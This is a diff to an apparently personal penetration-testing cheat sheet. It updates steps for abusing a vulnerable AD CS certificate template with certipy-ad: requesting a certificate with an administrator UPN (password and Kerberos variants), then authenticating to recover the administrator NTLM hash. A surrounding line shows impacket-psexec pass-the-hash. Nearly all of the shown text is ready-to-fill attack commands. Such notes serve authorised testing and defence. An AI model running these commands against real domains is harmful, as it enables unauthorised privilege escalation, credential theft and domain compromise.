@@ -210,13 +210,19 @@ impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
 #### 1. Generate a Cert with Altname
 
 ```console
-certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -upn administrator@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE>
+# Password
+certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -upn administrator@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096
+```
+
+```console
+# Kerberos
+certipy-ad req -u '<USER>' -p '<PASSWORD>' -k -target <TARGET> -upn administrator@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096
 ```
 
 #### 2. Get NTLM Hash
 
 ```console
-sudo ntpdate -s <DC> && certipy-ad auth -pfx administrator.pfx
+sudo ntpdate -s <DC> && certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>
 ```
 
 #### 3. Remote
